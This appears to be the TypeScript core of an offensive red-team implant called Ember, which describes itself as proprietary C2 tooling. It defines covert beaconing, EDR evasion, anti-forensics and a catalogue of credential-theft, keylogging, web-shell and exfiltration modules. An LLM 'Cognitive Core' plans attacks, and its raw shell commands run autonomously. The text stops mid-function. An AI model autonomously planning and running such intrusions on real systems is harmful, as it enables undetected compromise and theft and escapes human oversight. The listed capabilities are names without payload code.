/**
 * ═══════════════════════════════════════════════════════════════════════════════
 * EMBER — AC3 Proprietary Lightweight Agent Core
 * ═══════════════════════════════════════════════════════════════════════════════
 *
 * Ember is AC3's next-generation proprietary agent designed for internal
 * pentesting, red team operations, and remote deployment through exploited
 * vulnerabilities. It combines five novel architectural pillars:
 *
 *   1. Cognitive Core — LLM-powered autonomous decision engine that plans,
 *      adapts, and reasons about the target environment in real-time.
 *
 *   2. Polymorphic Protocol Engine — Adaptive multi-channel C2 with automatic
 *      failover, traffic mimicry, and protocol mutation on detection.
 *
 *   3. Modular Capability System — Plugin architecture where capabilities
 *      (recon, exploit, persist, exfil) are loaded on-demand from the C2.
 *
 *   4. Memory Stealth Architecture — Page-level encryption inspired by
 *      Nighthawk Evanesco; only active code pages are ever in plaintext.
 *
 *   5. Swarm Intelligence — Multi-agent coordination with shared intelligence,
 *      distributed task execution, and collective evasion.
 *
 * Unlike traditional agents that follow rigid playbooks, Ember's Cognitive Core
 * enables it to autonomously discover, adapt, and pivot based on what it finds
 * in the target environment — while the Polymorphic Protocol Engine ensures
 * its communications are indistinguishable from legitimate traffic.
 *
 * Author: Harrison Cook — AceofCloud / AC3
 * Classification: PROPRIETARY — AC3 Internal Use Only
 */

import { invokeLLM } from "../_core/llm";
import { getSafetyEngine, type SafetyLevel } from "./safety-engine";

// ═══════════════════════════════════════════════════════════════════════════════
// §1 — EMBER IDENTITY & CONFIGURATION
// ═══════════════════════════════════════════════════════════════════════════════

export const EMBER_VERSION = "1.0.0-alpha";
export const EMBER_CODENAME = "Ember";
export const EMBER_AGENT_TYPE = "ember" as const;

/** Supported target platforms for Ember deployment */
export type EmberPlatform = "windows_x64" | "windows_x86" | "linux_x64" | "linux_arm64" | "macos_x64" | "macos_arm64";

/** Ember deployment profiles — each trades stealth for capability */
export type EmberProfile =
  | "ghost"       // Minimal footprint: beacon-only, no tools, maximum evasion
  | "scout"       // Reconnaissance: passive recon + network mapping
  | "striker"     // Exploitation: full offensive toolkit
  | "sentinel"    // Persistence: long-term access maintenance
  | "hydra";      // Swarm: multi-agent coordination node

/** Communication channel types — Ember can use any combination */
export type EmberChannelType =
  | "https_beacon"      // Standard HTTPS with malleable profiles
  | "dns_covert"        // DNS TXT/CNAME record covert channel
  | "doh_tunnel"        // DNS-over-HTTPS tunnel (blends with browser traffic)
  | "websocket_stream"  // WebSocket for real-time interactive sessions
  | "icmp_covert"       // ICMP echo request/reply data channel
  | "smb_named_pipe"    // SMB named pipe for internal lateral comms
  | "steganography"     // Image-based steganographic channel
  | "p2p_mesh";         // Peer-to-peer mesh between Ember agents

/** Ember agent operational states */
export type EmberAgentState =
  | "initializing"   // Agent bootstrapping, key exchange
  | "dormant"        // Sleeping between beacons, memory encrypted
  | "active"         // Executing tasks, cognitive core engaged
  | "evading"        // Detected threat, switching channels/profiles
  | "pivoting"       // Lateral movement in progress
  | "exfiltrating"   // Data exfiltration active
  | "self_destruct"  // Kill switch activated, cleaning traces
  | "dead";          // Agent terminated

/** Cognitive autonomy levels — how much the agent decides on its own */
export type EmberAutonomyLevel =
  | "manual"         // Every action requires operator approval
  | "guided"         // Agent suggests, operator approves
  | "semi_auto"      // Agent executes low-risk autonomously, pauses for high-risk
  | "full_auto";     // Agent operates fully autonomously within RoE bounds

// ═══════════════════════════════════════════════════════════════════════════════
// §2 — EMBER AGENT CONFIGURATION
// ═══════════════════════════════════════════════════════════════════════════════

export interface EmberAgentConfig {
  /** Unique agent identifier (UUID v4) */
  agentId: string;
  /** Human-readable agent name */
  name: string;
  /** Deployment profile */
  profile: EmberProfile;
  /** Target platform */
  platform: EmberPlatform;
  /** Cognitive autonomy level */
  autonomy: EmberAutonomyLevel;
  /** Safety level from the safety engine */
  safetyLevel: SafetyLevel;
  /** Engagement ID this agent belongs to */
  engagementId: number;

  // ─── Beacon Configuration ───
  beacon: {
    /** Primary C2 channel */
    primaryChannel: EmberChannelType;
    /** Fallback channels in priority order */
    fallbackChannels: EmberChannelType[];
    /** Base beacon interval in seconds */
    intervalSeconds: number;
    /** Jitter percentage (0-50) for beacon randomization */
    jitterPercent: number;
    /** Maximum consecutive missed beacons before channel switch */
    maxMissedBeacons: number;
    /** Working hours (UTC) — agent only beacons during these hours */
    workingHours?: { start: number; end: number };
    /** Kill date — agent self-destructs after this timestamp */
    killDate?: number;
  };

  // ─── Evasion Configuration ───
  evasion: {
    /** Enable memory page encryption (Evanesco-inspired) */
    memoryEncryption: boolean;
    /** Enable sleep obfuscation */
    sleepObfuscation: boolean;
    /** Enable process masquerading */
    processMasquerade: boolean;
    /** Target process name for masquerading */
    masqueradeProcess?: string;
    /** Enable traffic profile mimicry */
    trafficMimicry: boolean;
    /** Traffic profile to mimic (e.g., "chrome_browsing", "teams_api", "outlook_sync") */
    trafficProfile?: string;
    /** Enable anti-forensics (log clearing, timestamp stomping) */
    antiForensics: boolean;
    /** Enable sandbox detection */
    sandboxDetection: boolean;
    /** Enable EDR detection and evasion */
    edrEvasion: boolean;
  };

  // ─── Capability Modules ───
  capabilities: EmberCapabilityModule[];

  // ─── Network Configuration ───
  network: {
    /** C2 callback URLs (multiple for redundancy) */
    callbackUrls: string[];
    /** Proxy configuration */
    proxy?: { type: "http" | "socks4" | "socks5"; url: string; auth?: { user: string; pass: string } };
    /** DNS servers for DNS-based channels */
    dnsServers?: string[];
    /** Domain fronting configuration */
    domainFronting?: { frontDomain: string; actualDomain: string };
    /** P2P mesh configuration */
    p2pConfig?: { listenPort: number; maxPeers: number; encryptionKey: string };
  };

  // ─── Cognitive Core Configuration ───
  cognitive: {
    /** Enable LLM-powered autonomous decision making */
    enabled: boolean;
    /** Maximum autonomous actions before requiring check-in */
    maxAutonomousActions: number;
    /** Risk threshold for autonomous decisions (0-100) */
    riskThreshold: number;
    /** Objective description for the cognitive core */
    objective?: string;
    /** Constraints the cognitive core must respect */
    constraints: string[];
  };
}

// ═══════════════════════════════════════════════════════════════════════════════
// §3 — CAPABILITY MODULE SYSTEM
// ═══════════════════════════════════════════════════════════════════════════════

export interface EmberCapabilityModule {
  /** Module identifier */
  id: string;
  /** Human-readable name */
  name: string;
  /** Module category */
  category: EmberCapabilityCategory;
  /** Module version */
  version: string;
  /** MITRE ATT&CK technique IDs this module implements */
  attackTechniques: string[];
  /** Required platform features */
  requirements: string[];
  /** Module payload (base64 encoded) — loaded on demand */
  payload?: string;
  /** Whether this module is currently loaded */
  loaded: boolean;
  /** Module-specific configuration */
  config?: Record<string, any>;
}

export type EmberCapabilityCategory =
  | "recon"          // Network discovery, service enumeration, OSINT
  | "credential"     // Credential harvesting, keylogging, token theft
  | "exploit"        // Vulnerability exploitation, payload delivery
  | "persistence"    // Registry, service, scheduled task persistence
  | "privilege"      // Privilege escalation techniques
  | "lateral"        // Lateral movement, pivoting
  | "collection"     // Data collection, screenshot, clipboard
  | "exfiltration"   // Data exfiltration channels
  | "evasion"        // Defense evasion, AV/EDR bypass
  | "impact"         // Ransomware simulation, data destruction (controlled)
  | "c2"             // C2 channel management
  | "cognitive";     // AI-powered decision modules

/** Pre-defined capability modules available for Ember agents */
export const EMBER_CAPABILITY_CATALOG: EmberCapabilityModule[] = [
  // ─── Reconnaissance ───
  {
    id: "ember.recon.network_mapper", name: "Network Mapper",
    category: "recon", version: "1.0.0",
    attackTechniques: ["T1046", "T1018", "T1016"],
    requirements: ["raw_socket"], loaded: false,
  },
  {
    id: "ember.recon.service_fingerprint", name: "Service Fingerprinter",
    category: "recon", version: "1.0.0",
    attackTechniques: ["T1046"],
    requirements: ["tcp_connect"], loaded: false,
  },
  {
    id: "ember.recon.ad_enumeration", name: "Active Directory Enumerator",
    category: "recon", version: "1.0.0",
    attackTechniques: ["T1087.002", "T1069.002", "T1482"],
    requirements: ["ldap_client", "windows"], loaded: false,
  },
  {
    id: "ember.recon.cloud_metadata", name: "Cloud Metadata Harvester",
    category: "recon", version: "1.0.0",
    attackTechniques: ["T1552.005", "T1580"],
    requirements: ["http_client"], loaded: false,
  },
  {
    id: "ember.recon.wifi_probe", name: "Wireless Network Probe",
    category: "recon", version: "1.0.0",
    attackTechniques: ["T1016.001"],
    requirements: ["wireless_interface"], loaded: false,
  },

  // ─── Credential Operations ───
  {
    id: "ember.cred.memory_dump", name: "Memory Credential Extractor",
    category: "credential", version: "1.0.0",
    attackTechniques: ["T1003.001", "T1003.006"],
    requirements: ["elevated", "windows"], loaded: false,
  },
  {
    id: "ember.cred.token_theft", name: "Token Impersonation",
    category: "credential", version: "1.0.0",
    attackTechniques: ["T1134.001", "T1134.003"],
    requirements: ["elevated", "windows"], loaded: false,
  },
  {
    id: "ember.cred.kerberoast", name: "Kerberoasting Module",
    category: "credential", version: "1.0.0",
    attackTechniques: ["T1558.003"],
    requirements: ["domain_joined", "windows"], loaded: false,
  },
  {
    id: "ember.cred.ssh_key_harvest", name: "SSH Key Harvester",
    category: "credential", version: "1.0.0",
    attackTechniques: ["T1552.004"],
    requirements: ["file_access"], loaded: false,
  },
  {
    id: "ember.cred.browser_extract", name: "Browser Credential Extractor",
    category: "credential", version: "1.0.0",
    attackTechniques: ["T1555.003"],
    requirements: ["file_access"], loaded: false,
  },

  // ─── Exploitation ───
  {
    id: "ember.exploit.shellcode_inject", name: "Shellcode Injector",
    category: "exploit", version: "1.0.0",
    attackTechniques: ["T1055.001", "T1055.012"],
    requirements: ["elevated"], loaded: false,
  },
  {
    id: "ember.exploit.dll_sideload", name: "DLL Sideloader",
    category: "exploit", version: "1.0.0",
    attackTechniques: ["T1574.002"],
    requirements: ["file_write", "windows"], loaded: false,
  },
  {
    id: "ember.exploit.web_shell", name: "Web Shell Deployer",
    category: "exploit", version: "1.0.0",
    attackTechniques: ["T1505.003"],
    requirements: ["file_write", "web_root_access"], loaded: false,
  },

  // ─── Persistence ───
  {
    id: "ember.persist.registry", name: "Registry Persistence",
    category: "persistence", version: "1.0.0",
    attackTechniques: ["T1547.001", "T1112"],
    requirements: ["windows", "registry_access"], loaded: false,
  },
  {
    id: "ember.persist.scheduled_task", name: "Scheduled Task Persistence",
    category: "persistence", version: "1.0.0",
    attackTechniques: ["T1053.005"],
    requirements: ["elevated"], loaded: false,
  },
  {
    id: "ember.persist.cron_job", name: "Cron Job Persistence",
    category: "persistence", version: "1.0.0",
    attackTechniques: ["T1053.003"],
    requirements: ["linux", "cron_access"], loaded: false,
  },
  {
    id: "ember.persist.service_install", name: "Service Installation",
    category: "persistence", version: "1.0.0",
    attackTechniques: ["T1543.003"],
    requirements: ["elevated"], loaded: false,
  },
  {
    id: "ember.persist.bootkit_sim", name: "Bootkit Simulation",
    category: "persistence", version: "1.0.0",
    attackTechniques: ["T1542.003"],
    requirements: ["elevated", "windows"], loaded: false,
  },

  // ─── Privilege Escalation ───
  {
    id: "ember.privesc.uac_bypass", name: "UAC Bypass",
    category: "privilege", version: "1.0.0",
    attackTechniques: ["T1548.002"],
    requirements: ["windows", "user_context"], loaded: false,
  },
  {
    id: "ember.privesc.suid_exploit", name: "SUID Binary Exploiter",
    category: "privilege", version: "1.0.0",
    attackTechniques: ["T1548.001"],
    requirements: ["linux"], loaded: false,
  },
  {
    id: "ember.privesc.kernel_exploit", name: "Kernel Exploit Loader",
    category: "privilege", version: "1.0.0",
    attackTechniques: ["T1068"],
    requirements: ["elevated_target"], loaded: false,
  },

  // ─── Lateral Movement ───
  {
    id: "ember.lateral.psexec", name: "PsExec Lateral Movement",
    category: "lateral", version: "1.0.0",
    attackTechniques: ["T1569.002", "T1021.002"],
    requirements: ["smb_access", "admin_creds"], loaded: false,
  },
  {
    id: "ember.lateral.wmi_exec", name: "WMI Remote Execution",
    category: "lateral", version: "1.0.0",
    attackTechniques: ["T1047"],
    requirements: ["wmi_access", "admin_creds", "windows"], loaded: false,
  },
  {
    id: "ember.lateral.ssh_pivot", name: "SSH Pivot",
    category: "lateral", version: "1.0.0",
    attackTechniques: ["T1021.004"],
    requirements: ["ssh_creds"], loaded: false,
  },
  {
    id: "ember.lateral.rdp_hijack", name: "RDP Session Hijack",
    category: "lateral", version: "1.0.0",
    attackTechniques: ["T1563.002"],
    requirements: ["elevated", "windows"], loaded: false,
  },
  {
    id: "ember.lateral.pass_the_hash", name: "Pass-the-Hash",
    category: "lateral", version: "1.0.0",
    attackTechniques: ["T1550.002"],
    requirements: ["ntlm_hash", "windows"], loaded: false,
  },

  // ─── Collection ───
  {
    id: "ember.collect.screenshot", name: "Screen Capture",
    category: "collection", version: "1.0.0",
    attackTechniques: ["T1113"],
    requirements: ["gui_access"], loaded: false,
  },
  {
    id: "ember.collect.keylogger", name: "Keylogger",
    category: "collection", version: "1.0.0",
    attackTechniques: ["T1056.001"],
    requirements: ["user_context"], loaded: false,
  },
  {
    id: "ember.collect.clipboard", name: "Clipboard Monitor",
    category: "collection", version: "1.0.0",
    attackTechniques: ["T1115"],
    requirements: ["user_context"], loaded: false,
  },
  {
    id: "ember.collect.file_harvest", name: "Sensitive File Harvester",
    category: "collection", version: "1.0.0",
    attackTechniques: ["T1005", "T1039"],
    requirements: ["file_access"], loaded: false,
  },

  // ─── Exfiltration ───
  {
    id: "ember.exfil.https_chunked", name: "HTTPS Chunked Exfiltration",
    category: "exfiltration", version: "1.0.0",
    attackTechniques: ["T1041"],
    requirements: ["http_client"], loaded: false,
  },
  {
    id: "ember.exfil.dns_tunnel", name: "DNS Tunnel Exfiltration",
    category: "exfiltration", version: "1.0.0",
    attackTechniques: ["T1048.001"],
    requirements: ["dns_access"], loaded: false,
  },
  {
    id: "ember.exfil.steganographic", name: "Steganographic Exfiltration",
    category: "exfiltration", version: "1.0.0",
    attackTechniques: ["T1027.003"],
    requirements: ["http_client"], loaded: false,
  },

  // ─── Evasion ───
  {
    id: "ember.evasion.amsi_bypass", name: "AMSI Bypass",
    category: "evasion", version: "1.0.0",
    attackTechniques: ["T1562.001"],
    requirements: ["windows"], loaded: false,
  },
  {
    id: "ember.evasion.etw_patch", name: "ETW Patching",
    category: "evasion", version: "1.0.0",
    attackTechniques: ["T1562.006"],
    requirements: ["windows", "elevated"], loaded: false,
  },
  {
    id: "ember.evasion.log_cleaner", name: "Log Cleaner",
    category: "evasion", version: "1.0.0",
    attackTechniques: ["T1070.001", "T1070.002"],
    requirements: ["elevated"], loaded: false,
  },
  {
    id: "ember.evasion.timestomp", name: "Timestamp Manipulation",
    category: "evasion", version: "1.0.0",
    attackTechniques: ["T1070.006"],
    requirements: ["file_access"], loaded: false,
  },

  // ─── Cognitive Modules ───
  {
    id: "ember.cognitive.attack_planner", name: "AI Attack Planner",
    category: "cognitive", version: "1.0.0",
    attackTechniques: [],
    requirements: ["llm_access"], loaded: false,
  },
  {
    id: "ember.cognitive.env_analyzer", name: "Environment Analyzer",
    category: "cognitive", version: "1.0.0",
    attackTechniques: ["T1082", "T1083"],
    requirements: [], loaded: false,
  },
  {
    id: "ember.cognitive.evasion_adapter", name: "Adaptive Evasion Engine",
    category: "cognitive", version: "1.0.0",
    attackTechniques: ["T1027"],
    requirements: ["llm_access"], loaded: false,
  },
];

// ═══════════════════════════════════════════════════════════════════════════════
// §4 — EMBER BEACON PROTOCOL
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Ember Beacon Protocol — the communication contract between agent and C2.
 *
 * Unlike traditional beacons that use fixed intervals and predictable patterns,
 * Ember's beacon protocol features:
 *   - Adaptive jitter based on network activity patterns
 *   - Channel hopping on detection or failure
 *   - Encrypted metadata with per-session keys
 *   - Traffic shaping to mimic legitimate application protocols
 */

export interface EmberBeacon {
  /** Protocol version */
  version: string;
  /** Agent identifier */
  agentId: string;
  /** Beacon sequence number (monotonically increasing) */
  sequence: number;
  /** Current agent state */
  state: EmberAgentState;
  /** Timestamp (UTC epoch ms) */
  timestamp: number;
  /** Session key fingerprint for message authentication */
  sessionKeyFingerprint: string;
  /** Encrypted payload (base64) */
  encryptedPayload: string;
  /** HMAC signature of the beacon */
  hmac: string;
  /** Channel this beacon was sent over */
  channel: EmberChannelType;
}

export interface EmberBeaconPayload {
  /** System information snapshot */
  systemInfo: EmberSystemInfo;
  /** Pending task results */
  taskResults: EmberTaskResult[];
  /** Collected intelligence */
  intelligence: EmberIntelligence[];
  /** Agent health metrics */
  health: EmberHealthMetrics;
  /** Cognitive core status (if enabled) */
  cognitiveStatus?: EmberCognitiveStatus;
  /** Swarm coordination data */
  swarmData?: EmberSwarmData;
}

export interface EmberSystemInfo {
  hostname: string;
  username: string;
  domain?: string;
  platform: string;
  architecture: string;
  osVersion: string;
  pid: number;
  processName: string;
  integrity: "low" | "medium" | "high" | "system";
  isElevated: boolean;
  networkInterfaces: Array<{
    name: string;
    ipv4: string;
    ipv6?: string;
    mac: string;
    gateway?: string;
  }>;
  installedSoftware?: string[];
  runningProcesses?: Array<{ pid: number; name: string; user: string }>;
  activeConnections?: Array<{ localAddr: string; remoteAddr: string; state: string; pid: number }>;
  securityProducts?: Array<{ name: string; type: "av" | "edr" | "firewall" | "dlp"; running: boolean }>;
}

export interface EmberHealthMetrics {
  /** CPU usage percentage */
  cpuPercent: number;
  /** Memory usage in MB */
  memoryMb: number;
  /** Disk I/O rate */
  diskIoRate: number;
  /** Network bytes sent since last beacon */
  networkBytesSent: number;
  /** Network bytes received since last beacon */
  networkBytesReceived: number;
  /** Number of loaded capability modules */
  loadedModules: number;
  /** Current evasion score (0-100, higher = more evasive) */
  evasionScore: number;
  /** Detected security products */
  detectedThreats: string[];
  /** Channel health for each configured channel */
  channelHealth: Record<EmberChannelType, { latencyMs: number; reliability: number; lastSuccess: number }>;
}

// ═══════════════════════════════════════════════════════════════════════════════
// §5 — EMBER TASKING SYSTEM
// ═══════════════════════════════════════════════════════════════════════════════

export type EmberTaskType =
  | "execute_module"     // Load and execute a capability module
  | "shell_command"      // Execute a raw shell command
  | "file_operation"     // Upload/download/delete files
  | "channel_switch"     // Switch to a different C2 channel
  | "config_update"      // Update agent configuration
  | "cognitive_query"    // Query the cognitive core for a decision
  | "swarm_command"      // Swarm coordination command
  | "self_destruct"      // Initiate self-destruction sequence
  | "sleep_update"       // Change beacon interval/jitter
  | "module_load"        // Load a new capability module
  | "module_unload"      // Unload a capability module
  | "pivot_setup"        // Set up a pivot/proxy through this agent
  | "screenshot"         // Take a screenshot
  | "keylog_toggle"      // Toggle keylogger on/off
  | "process_inject"     // Inject into a target process
  | "token_steal"        // Steal a process token
  | "persist_install"    // Install persistence mechanism
  | "persist_remove"     // Remove persistence mechanism
  | "exfil_data"         // Exfiltrate collected data
  | "socks_proxy"        // Start/stop SOCKS proxy
  | "port_forward";      // Set up port forwarding

export interface EmberTask {
  /** Unique task identifier */
  taskId: string;
  /** Task type */
  type: EmberTaskType;
  /** Task priority (1-10, 10 = highest) */
  priority: number;
  /** Task parameters */
  params: Record<string, any>;
  /** MITRE ATT&CK technique being executed */
  attackTechnique?: string;
  /** Timeout in seconds */
  timeoutSeconds: number;
  /** Whether this task requires elevated privileges */
  requiresElevation: boolean;
  /** Safety assessment result */
  safetyAssessment?: {
    allowed: boolean;
    riskScore: number;
    reason: string;
  };
  /** Cognitive core reasoning (if AI-generated) */
  cognitiveReasoning?: string;
  /** Created timestamp */
  createdAt: number;
  /** Assigned by (operator ID or "cognitive_core") */
  assignedBy: string;
}

export interface EmberTaskResult {
  taskId: string;
  status: "success" | "failed" | "timeout" | "blocked" | "partial";
  exitCode?: number;
  output?: string;
  error?: string;
  /** Artifacts produced (files, credentials, etc.) */
  artifacts: EmberArtifact[];
  /** Duration in milliseconds */
  durationMs: number;
  /** Technique execution metadata */
  executionMetadata?: {
    technique: string;
    tactic: string;
    detectionRisk: "low" | "medium" | "high";
    opsecNotes: string;
  };
  completedAt: number;
}

export interface EmberArtifact {
  id: string;
  type: "file" | "credential" | "screenshot" | "network_map" | "process_list" | "registry_key" | "log_entry" | "intelligence";
  name: string;
  description: string;
  /** Base64 encoded data (for small artifacts) */
  data?: string;
  /** Size in bytes */
  size: number;
  /** SHA-256 hash */
  hash: string;
  /** MITRE ATT&CK technique that produced this artifact */
  technique?: string;
  collectedAt: number;
}

// ═══════════════════════════════════════════════════════════════════════════════
// §6 — EMBER INTELLIGENCE SYSTEM
// ═══════════════════════════════════════════════════════════════════════════════

export interface EmberIntelligence {
  /** Intelligence type */
  type: "host_discovery" | "service_discovery" | "credential_found" | "vulnerability_found"
    | "network_topology" | "security_product" | "user_activity" | "data_location"
    | "lateral_path" | "privilege_path" | "persistence_opportunity";
  /** Confidence score (0-100) */
  confidence: number;
  /** Intelligence data */
  data: Record<string, any>;
  /** Source agent ID */
  sourceAgentId: string;
  /** Whether this intelligence has been shared with the swarm */
  sharedWithSwarm: boolean;
  /** Timestamp */
  discoveredAt: number;
}

// ═══════════════════════════════════════════════════════════════════════════════
// §7 — COGNITIVE CORE (AI-POWERED DECISION ENGINE)
// ═══════════════════════════════════════════════════════════════════════════════

export interface EmberCognitiveStatus {
  /** Whether the cognitive core is active */
  active: boolean;
  /** Current objective being pursued */
  currentObjective: string;
  /** Planned next actions */
  plannedActions: Array<{
    action: string;
    technique: string;
    riskLevel: "low" | "medium" | "high";
    reasoning: string;
  }>;
  /** Actions taken autonomously since last check-in */
  autonomousActionsTaken: number;
  /** Remaining autonomous action budget */
  autonomousActionsRemaining: number;
  /** Environment assessment */
  environmentAssessment: {
    networkSegment: string;
    securityPosture: "weak" | "moderate" | "strong" | "hardened";
    detectedControls: string[];
    recommendedApproach: string;
  };
}

/**
 * Cognitive Core — The AI brain of an Ember agent.
 *
 * This is what makes Ember fundamentally different from every other C2 agent.
 * Instead of following rigid playbooks, the Cognitive Core:
 *
 *   1. Analyzes the environment (OS, security products, network topology)
 *   2. Plans an attack path based on the objective and constraints
 *   3. Selects and loads appropriate capability modules
 *   4. Executes techniques with adaptive evasion
 *   5. Learns from results and adjusts strategy
 *
 * The Cognitive Core communicates with the AC3 LLM backend to make decisions,
 * but can also operate in a degraded "heuristic" mode if LLM access is lost.
 */
export class EmberCognitiveCore {
  private agentId: string;
  private objective: string;
  private constraints: string[];
  private autonomyLevel: EmberAutonomyLevel;
  private maxActions: number;
  private actionsTaken: number = 0;
  private riskThreshold: number;
  private environmentContext: Record<string, any> = {};
  private actionHistory: Array<{ action: string; result: string; timestamp: number }> = [];
  private planCache: Array<{ action: string; technique: string; riskLevel: string; reasoning: string }> = [];

  constructor(config: {
    agentId: string;
    objective: string;
    constraints: string[];
    autonomyLevel: EmberAutonomyLevel;
    maxActions: number;
    riskThreshold: number;
  }) {
    this.agentId = config.agentId;
    this.objective = config.objective;
    this.constraints = config.constraints;
    this.autonomyLevel = config.autonomyLevel;
    this.maxActions = config.maxActions;
    this.riskThreshold = config.riskThreshold;
    this.actionsTaken = 0;
  }

  /**
   * Analyze the target environment and produce an initial attack plan.
   * This is called when the agent first lands on a target.
   */
  async analyzeEnvironment(systemInfo: EmberSystemInfo): Promise<{
    assessment: EmberCognitiveStatus["environmentAssessment"];
    initialPlan: EmberCognitiveStatus["plannedActions"];
  }> {
    this.environmentContext = {
      hostname: systemInfo.hostname,
      platform: systemInfo.platform,
      isElevated: systemInfo.isElevated,
      securityProducts: systemInfo.securityProducts || [],
      networkInterfaces: systemInfo.networkInterfaces,
      domain: systemInfo.domain,
    };

    const systemPrompt = `You are the Cognitive Core of Ember, AC3's proprietary red team agent.
You are deployed on a target system during an authorized penetration test.
Your role is to analyze the environment and plan the next steps.

OBJECTIVE: ${this.objective}
CONSTRAINTS: ${this.constraints.join("; ")}
AUTONOMY LEVEL: ${this.autonomyLevel}
RISK THRESHOLD: ${this.riskThreshold}/100

You must respond with a JSON object containing:
1. "assessment" — your analysis of the environment's security posture
2. "initialPlan" — your recommended next actions (max 5)

Each planned action must include:
- "action": what to do
- "technique": MITRE ATT&CK technique ID
- "riskLevel": "low", "medium", or "high"
- "reasoning": why this action advances the objective`;

    const userPrompt = `Analyze this target environment and plan the attack:

SYSTEM INFO:
- Hostname: ${systemInfo.hostname}
- Username: ${systemInfo.username}
- Domain: ${systemInfo.domain || "N/A (workgroup)"}
- Platform: ${systemInfo.platform} ${systemInfo.architecture}
- OS Version: ${systemInfo.osVersion}
- Integrity: ${systemInfo.integrity}
- Elevated: ${systemInfo.isElevated}
- Process: ${systemInfo.processName} (PID ${systemInfo.pid})

NETWORK:
${systemInfo.networkInterfaces.map(n => `  ${n.name}: ${n.ipv4} (${n.mac})`).join("\n")}

SECURITY PRODUCTS:
${(systemInfo.securityProducts || []).map(s => `  ${s.name} (${s.type}) — ${s.running ? "RUNNING" : "STOPPED"}`).join("\n") || "  None detected"}

RUNNING PROCESSES (sample):
${(systemInfo.runningProcesses || []).slice(0, 20).map(p => `  ${p.pid}: ${p.name} (${p.user})`).join("\n") || "  Not enumerated"}

ACTION HISTORY:
${this.actionHistory.map(a => `  [${new Date(a.timestamp).toISOString()}] ${a.action} → ${a.result}`).join("\n") || "  No previous actions"}`;

    try {
      const response = await invokeLLM({
        messages: [
          { role: "system", content: systemPrompt },
          { role: "user", content: userPrompt },
        ],
        response_format: {
          type: "json_schema",
          json_schema: {
            name: "ember_cognitive_analysis",
            strict: true,
            schema: {
              type: "object",
              properties: {
                assessment: {
                  type: "object",
                  properties: {
                    networkSegment: { type: "string", description: "Identified network segment" },
                    securityPosture: { type: "string", enum: ["weak", "moderate", "strong", "hardened"] },
                    detectedControls: { type: "array", items: { type: "string" } },
                    recommendedApproach: { type: "string", description: "High-level strategy recommendation" },
                  },
                  required: ["networkSegment", "securityPosture", "detectedControls", "recommendedApproach"],
                  additionalProperties: false,
                },
                initialPlan: {
                  type: "array",
                  items: {
                    type: "object",
                    properties: {
                      action: { type: "string" },
                      technique: { type: "string" },
                      riskLevel: { type: "string", enum: ["low", "medium", "high"] },
                      reasoning: { type: "string" },
                    },
                    required: ["action", "technique", "riskLevel", "reasoning"],
                    additionalProperties: false,
                  },
                },
              },
              required: ["assessment", "initialPlan"],
              additionalProperties: false,
            },
          },
        },
      });

      const parsed = JSON.parse(response.choices[0].message.content || "{}");
      this.planCache = parsed.initialPlan || [];
      return parsed;
    } catch (error) {
      // Fallback to heuristic analysis if LLM is unavailable
      return this.heuristicAnalysis(systemInfo);
    }
  }

  /**
   * Decide the next action based on current state and intelligence.
   * Returns null if operator approval is needed.
   */
  async decideNextAction(
    currentState: EmberAgentState,
    intelligence: EmberIntelligence[],
    availableModules: EmberCapabilityModule[],
  ): Promise<EmberTask | null> {
    if (this.actionsTaken >= this.maxActions) return null;
    if (this.autonomyLevel === "manual") return null;

    // Use cached plan if available
    if (this.planCache.length > 0) {
      const nextPlanned = this.planCache[0];
      const riskMap: Record<string, number> = { low: 20, medium: 50, high: 80 };
      const risk = riskMap[nextPlanned.riskLevel] || 50;

      if (this.autonomyLevel === "guided") return null; // Suggest only
      if (this.autonomyLevel === "semi_auto" && risk > this.riskThreshold) return null;

      this.planCache.shift();
      this.actionsTaken++;

      const matchingModule = availableModules.find(m =>
        m.attackTechniques.includes(nextPlanned.technique)
      );

      return {
        taskId: `ember-cognitive-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
        type: matchingModule ? "execute_module" : "shell_command",
        priority: 5,
        params: matchingModule
          ? { moduleId: matchingModule.id, technique: nextPlanned.technique }
          : { command: nextPlanned.action },
        attackTechnique: nextPlanned.technique,
        timeoutSeconds: 300,
        requiresElevation: false,
        cognitiveReasoning: nextPlanned.reasoning,
        createdAt: Date.now(),
        assignedBy: "cognitive_core",
      };
    }

    // If no cached plan, generate new one via LLM
    try {
      const response = await invokeLLM({
        messages: [
          {
            role: "system",
            content: `You are Ember's Cognitive Core. Based on the current intelligence, decide the single best next action.
OBJECTIVE: ${this.objective}
CONSTRAINTS: ${this.constraints.join("; ")}
Actions taken: ${this.actionsTaken}/${this.maxActions}
Risk threshold: ${this.riskThreshold}/100

Respond with JSON: { "action": "...", "technique": "T####", "riskLevel": "low|medium|high", "reasoning": "...", "taskType": "execute_module|shell_command", "params": {} }`,
          },
          {
            role: "user",
            content: `Current state: ${currentState}\nIntelligence:\n${JSON.stringify(intelligence.slice(-10), null, 2)}\nAvailable modules: ${availableModules.map(m => m.id).join(", ")}`,
          },
        ],
      });

      const decision = JSON.parse(response.choices[0].message.content || "{}");
      if (!decision.action) return null;

      this.actionsTaken++;
      return {
        taskId: `ember-cognitive-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
        type: decision.taskType || "shell_command",
        priority: 5,
        params: decision.params || {},
        attackTechnique: decision.technique,
        timeoutSeconds: 300,
        requiresElevation: false,
        cognitiveReasoning: decision.reasoning,
        createdAt: Date.now(),
        assignedBy: "cognitive_core",
      };
    } catch {
      return null;
    }
  }

  /** Record an action result for learning */
  recordActionResult(action: string, result: string): void {
    this.actionHistory.push({ action, result, timestamp: Date.now() });
    if (this.actionHistory.length > 100) this.actionHistory = this.actionHistory.slice(-80);
  }

  /** Heuristic fallback when LLM is unavailable */
  private heuristicAnalysis(systemInfo: EmberSystemInfo): {
    assessment: EmberCognitiveStatus["environmentAssessment"];
    initialPlan: EmberCognitiveStatus["plannedActions"];
  } {
    const hasEDR = (systemInfo.securityProducts || []).some(s => s.type === "edr" && s.running);
    const hasAV = (systemInfo.securityProducts || []).some(s => s.type === "av" && s.running);
    const isWindows = systemInfo.platform.toLowerCase().includes("windows");
    const isDomainJoined = !!systemInfo.domain;

    const securityPosture = hasEDR ? "strong" : hasAV ? "moderate" : "weak";
    const detectedControls = [
      ...(hasEDR ? ["EDR detected"] : []),
      ...(hasAV ? ["AV detected"] : []),
      ...(systemInfo.securityProducts || []).filter(s => s.type === "firewall").map(s => `Firewall: ${s.name}`),
    ];

    const plan: EmberCognitiveStatus["plannedActions"] = [];

    // Step 1: Always enumerate
    plan.push({
